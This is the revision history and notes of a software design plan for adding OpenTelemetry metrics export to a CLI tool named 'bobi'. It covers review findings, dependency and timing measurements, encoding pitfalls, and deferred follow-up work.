- **2026-08-05** (create): plan drafted.
- **2026-08-05** (review): revised in draft after three adversarial lenses
  (red-team, staff engineer, implementer). Eleven must-fix findings folded in;
  five forks resolved into Decisions D1–D5. Substantive corrections: the
  request body is `ExportMetricsServiceRequest`, not a bare `ResourceMetrics`;
  `opentelemetry-proto` moves from an `[otel]` extra to a core dependency
  (the extra was uninstalled in every CI job and undeliverable through
  `tool_library`); registration switches to `@agent.group("otel")` per the
  `subagents` pattern; a Security model section was added; and the identity
  resolver is promoted to `bobi/identity.py`.
- **2026-08-05** (split): approved and merged as `b1aca66`; split into one
  lane, dispatched as #978 (marker mode `solo`). No parallel cut was justified
  — the phases are strictly sequential and the sequential estimate is a single
  agent session.
- **2026-08-05** (split self-review): returned to **Draft**. The Split-stage
  implementer self-review found six blocking defects surviving the reviewed
  plan — a temporality default that rejects every gauge, an emission cap that
  bounds nothing, a Phase 5 CI home that does not exist, a Phase 1 gate that
  collects 11 tests instead of 36, a Phase 2 gate circular on Phase 3, and an
  unspecifiable tool_library `success:` probe. Nothing had been built against
  this plan (no bot PR existed), so the corrections are made in place under
  Draft rather than accreted as superseding amendments a builder would have to
  reconcile. Dispatch issue #978 is marked blocked until it returns to
  Approved.

## Notes

- **Measurements** (this repo, 2026-08-05, macOS, warm FS cache, median of
  3–5): bare interpreter ~20ms; `import httpx` ~90ms; `bobi --version` ~120ms;
  `opentelemetry-proto` pb2 modules ~10ms marginal; full `opentelemetry-sdk` +
  OTLP HTTP exporter ~150ms / 15 packages; `from bobi.supervisor.identity
  import …` ~40ms (~20ms marginal, from the package's eager imports).
- `opentelemetry-proto` 1.44.0 requires `protobuf>=5,<8`. The repo's venv
  already carries 7.35.1 transitively via `onnxruntime` ← `fastembed`, so the
  constraint is satisfiable today.
- **Unverified, and deliberately not load-bearing:** whether Grafana Cloud's
  OTLP gateway accepts JSON payloads (medium confidence that it does).
  Irrelevant under the protobuf decision; recorded so a future reader does not
  treat the JSON path as known-good.
- OTLP/JSON encoding traps, for whoever revisits the encoding decision:
  64-bit integers must be JSON strings, and trace/span ids are hex rather than
  proto3 JSON's base64.
- The five `main.add_command(...)` calls at `bobi/cli.py:2360`, `:2385`,
  `:2716`, `:2846`, `:3457` are redundant idempotent re-adds — verified by
  prototype. Do not add a sixth.
- `tests/test_tool_guides.py`'s `_contract_files()` does **not** cover
  `bobi/tool_library/*/guide.md`, so the agent-facing guide gets no contract
  checking. Pre-existing gap, noted not fixed here.
- Deferred follow-ups: spans (a one-shot CLI has no context to hold open);
  per-emission audit logging; cross-runtime invocation refusal; a
  non-overridable `bobi.authored=agent` attribute; and `service.name`
  defaulting to `bobi.<agent>` rather than `bobi` so teams do not share one
  series namespace.
